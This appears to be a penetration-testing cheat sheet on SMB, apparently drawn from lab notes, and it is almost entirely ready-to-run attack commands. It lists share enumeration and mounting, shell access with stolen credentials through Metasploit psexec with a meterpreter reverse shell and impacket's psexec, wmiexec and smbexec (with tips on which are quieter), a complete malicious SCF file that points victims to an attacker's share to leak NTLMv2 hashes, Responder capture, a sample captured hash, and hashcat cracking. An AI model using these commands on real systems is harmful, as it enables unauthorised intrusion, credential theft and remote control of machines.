### SMB
#### Enumerating and Mounting
```
# Connect to SMB share using smbclient
smbclient //MOUNT/share -I target -N

# Another way to mount shares using smbclient
smbclient \\\\<ip>\\<sharename>

# Scan smb share using smbmap
smbmap -H xx.xx.xx.xxx
# or
smbmap -H xx.xx.xx.xxx -u anonymous

# Scan smb share using smbclient
smbclient -N -L //xx.xx.xx.xxx

# Mount smb share directly to Linux
mount -t cifs //serverip/sharename /media/windowsshare

```
#### Gaining shell with SMB credentials (usually used with AD exploits)
```
# Using metasploit. (Always try 'exploit' twice!)
use exploit/windows/smb/psexec
set smbdomain marvel.local
set smbpass <password>
set smbuser <username>
set payload windows/x64/meterpreter/reverse_tcp
exploit
# If this doesn't work, attempt to change the automatic targeting.
show targets

# Using psexec.py
psexec.py marvel.local/username:password@<ip>

# Using wmiexec.py (this is quieter than psexec.py)
wmiexec.py marvel.local/username:password@<ip>

# Using smbexec.py (this is quieter than psexec.py)
smbexec.py marvel.local/username:password@<ip>
```

#### SCF file attacks using SMB
```
# Create @exploit.scf file with following
[Shell]
Command=2
IconFile=\\<attackingip>\share\test.ico
[Taskbar]
Command=ToggleDesktop

# Start responder on your attacking machine
responder -wrf --lm -v -I tun0

# Upload the @exploit.scf to the server and wait for responder to capture the NTLMv2 hash.
[SMB] NTLMv2 Hash     : tony::DRIVER:79d968a4f5cee962:C821932E31C78D0AD6229C9B3718709F:01010000000000003FD7E71A9D2BD8015CA798B5DEABF44800000000020000000000000000000000

# Copy that hash into a hash.txt file and use hashcat to crack it
hashcat -a 0 -m 5600 hash.txt rockyou.txt -O
```
